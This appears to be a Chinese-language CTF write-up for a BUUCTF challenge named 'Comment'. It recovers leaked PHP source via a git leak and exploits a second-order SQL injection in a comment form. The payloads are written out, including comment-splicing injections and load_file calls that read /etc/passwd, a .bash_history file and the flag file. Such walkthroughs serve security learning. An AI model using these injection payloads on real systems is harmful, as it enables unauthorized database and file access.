---
title: Comment
date: 2021-04-06 16:55:26
tags: wp

---
## '__'
留言那里存在XSS，BUU的XSS平台没法注册，就没试'()'
       
二次注入      

![06.png](https://ae03.alicdn.com/kf/Ufb2c6edbf3b34e8e8cb710859b4ac8a9q.jpg)
提示了账号和密码，一般后面是三位数字，爆破是666       
![](https://ftp.bmp.ovh/imgs/2021/04/04a05effe6890640.png)      
`write_do.php`    
看WP是git泄露        
Githack一下下载下来`write_do.php`  ，但是是残缺的，git log历史commit里也没`add write_do.php`??      





	```php
	<?php
	include "mysql.php";
	session_start();
	if($_SESSION['login'] != 'yes'){
	    header("Location: ./login.php");
	    die();
	}
	if(isset($_GET['do'])){
	switch ($_GET['do'])
	{
	case 'write':     ##发帖
	    $category = addslashes($_POST['category']);
	    $title = addslashes($_POST['title']);
	    $content = addslashes($_POST['content']);
	    $sql = "insert into board
	            set category = '$category',
	                title = '$title',
	                content = '$content'";
	    $result = mysql_query($sql);
	    header("Location: ./index.php");
	    break;
	case 'comment':   ##留言
	    $bo_id = addslashes($_POST['bo_id']);
	    $sql = "select category from board where id='$bo_id'";
	    $result = mysql_query($sql);
	    $num = mysql_num_rows($result);
	    if($num>0){
	    $category = mysql_fetch_array($result)['category'];
	    $content = addslashes($_POST['content']);
	    $sql = "insert into comment
	            set category = '$category',
	                content = '$content',
	                bo_id = '$bo_id'";
	    $result = mysql_query($sql);
	    }
	    header("Location: ./comment.php?id=$bo_id");
	    break;
	default:
	    header("Location: ./index.php");
	}
	}
	else{
	    header("Location: ./index.php");
	}
	?>
	```




虽然有addslashes函数，但是，数据库查询时会自动过滤调斜线的     
![](https://ftp.bmp.ovh/imgs/2021/04/4d8c1aa58308f665.png)     
      
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";      


`category=',content=database(),/*     `   
留言输入`content=*/#`         
就成了      

    $sql = "insert into comment
            set category = '',content=database(),/*',
                content = '*/#',
                bo_id = '$bo_id'";      


就可以查询库了 ----`ctf`       
然后查表啥的，但查不出来       

`load_file`        

`	',content=load_file('/etc/passwd'),/*`     
![](https://ftp.bmp.ovh/imgs/2021/04/f60314c154735390.png)       

`',content=load_file('/home/www/.bash_history'),/*`      
![](https://ftp.bmp.ovh/imgs/2021/04/4ec8c167bc9d6949.png)    

虽然被删了，但`/tmp/html`中还有        
`',content=load_file('/tmp/html/.DS_Store'),/*`会乱码，加hex`',content=hex(load_file('/tmp/html/.DS_Store')),/*`   
![](https://ftp.bmp.ovh/imgs/2021/04/430404dd20585acc.png) 

`',content=hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php')),/*`      
解码得到flag     
